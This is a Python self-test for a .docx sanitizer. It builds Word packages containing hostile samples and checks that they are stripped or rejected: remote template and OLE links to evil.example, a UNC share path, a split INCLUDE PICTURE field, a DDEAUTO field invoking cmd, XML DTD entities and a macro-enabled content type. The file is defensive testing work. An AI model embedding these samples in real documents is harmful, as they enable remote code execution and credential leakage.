"""Self-check for sanitize_docx: run with the worker's Python from the worker folder: python test_sanitize.py"""
import io
import zipfile

from fastapi import HTTPException

from app import sanitize_docx

R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
RELS = (
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    f'<Relationship Id="rId1" Type="{R}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>'
    f"<Relationship Id='rId4' Type='{R}/oleObject' Target='https://evil.example/single' TargetMode='External'/>"
    f'<Relationship Id="rId5" Type="{R}/image" Target="https://evil.example/spaced" TargetMode = " external "></Relationship>'
    f'<Relationship Id="rId6" Type="{R}/hyperlink" Target="file://evil.example/share/x" TargetMode="External"/>'
    f'<Relationship Id="rId7" Type="{R}/frame" Target="\\\\evil.example\\share\\x.docx"/>'
    f'<Relationship Id="rId2" Type="{R}/hyperlink" Target="https://example.com" TargetMode="External"/>'
    f'<Relationship Id="rId3" Type="{R}/styles" Target="styles.xml"/>'
    "</Relationships>"
)


def pkg(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, body in {"[Content_Types].xml": "<Types/>", **files}.items():
            z.writestr(name, body)
    return buf.getvalue()


def rejected(files):
    try:
        sanitize_docx(pkg(files))
        return False
    except HTTPException as e:
        assert e.status_code == 415
        return True


clean = zipfile.ZipFile(io.BytesIO(sanitize_docx(pkg({"word/_rels/settings.xml.rels": RELS}))))
rels = clean.read("word/_rels/settings.xml.rels").decode()
assert "evil.example" not in rels, "external, file: and UNC targets are removed however they are written"
assert "https://example.com" in rels, "plain hyperlinks are kept"
assert 'Target="styles.xml"' in rels, "internal relationships are kept"

doc = f'<w:document {W}><w:body><w:p><w:r><w:t>Plain text</w:t></w:r></w:p></w:body></w:document>'
assert not rejected({"word/document.xml": doc}), "an ordinary document passes"

split = f'<w:document {W}><w:body><w:p><w:r><w:instrText> INCLUDE</w:instrText></w:r><w:r><w:instrText>PICTURE "\\\\evil\\x.png" </w:instrText></w:r></w:p></w:body></w:document>'
assert rejected({"word/document.xml": split}), "linked field split across runs"
assert rejected({"word/header1.xml": f'<w:hdr {W}><w:fldSimple w:instr="DDEAUTO cmd x"/></w:hdr>'}), "DDE field"

dtd = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "aaaa">]><r>&a;</r>'
assert rejected({"word/document.xml": dtd}), "DTD in UTF-8"
assert rejected({"word/document.xml": dtd.replace('version="1.0"', 'version="1.0" encoding="UTF-16"').encode("utf-16")}), "DTD in UTF-16"
assert rejected({"word/_rels/document.xml.rels": "<Relationships"}), "unparseable .rels"
assert rejected({"[Content_Types].xml": '<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'}), "macros"

print("sanitize_docx ok")
